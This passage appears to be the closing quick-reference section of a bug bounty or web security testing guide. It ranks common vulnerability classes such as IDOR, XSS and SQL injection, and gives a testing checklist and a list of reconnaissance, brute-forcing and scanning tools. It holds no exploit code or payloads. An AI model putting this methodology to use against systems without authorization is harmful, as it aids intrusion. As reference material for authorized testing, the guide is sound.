- Do not access production data for testing purposes

---

# Quick Reference

## Most Common Findings (by impact)
1. IDOR/BOLA
2. XSS (Stored > Reflected > DOM)
3. SQL Injection
4. SSRF
5. Authentication Bypass
6. Privilege Escalation
7. Business Logic Flaws
8. Race Conditions
9. Mass Assignment
10. Open Redirect

## Testing Checklist
- [ ] Reconnaissance complete
- [ ] Attack surface mapped
- [ ] Authentication tested
- [ ] Authorization tested per endpoint
- [ ] Input validation tested
- [ ] Business logic tested
- [ ] Common vulnerability classes tested
- [ ] Chaining opportunities identified
- [ ] Findings documented
- [ ] Report submitted

## Essential Tools
- Intercepting proxy (Burp Suite, OWASP ZAP)
- Reconnaissance (subfinder, amass, httpx)
- Directory brute-forcing (ffuf, feroxbuster)
- JavaScript analysis (LinkFinder, SecretFinder)
- Vulnerability scanning (Nuclei)
- Wordlists (SecLists,raft)
- DNS tools (dnsx, massdns)
- Port scanning (naabu, nmap)
